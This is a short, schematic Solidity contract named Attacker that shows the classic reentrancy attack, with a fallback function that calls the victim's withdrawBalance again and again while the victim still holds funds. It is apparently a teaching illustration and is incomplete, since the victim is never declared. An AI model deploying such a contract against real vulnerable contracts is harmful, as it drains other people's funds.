contract Attacker {

    function startattack() {
        victim.withdrawBalance();
    }

    function() payable {
        if (victim.balance > msg.value) {
            victim.withdrawBalance();
        }
    }
}
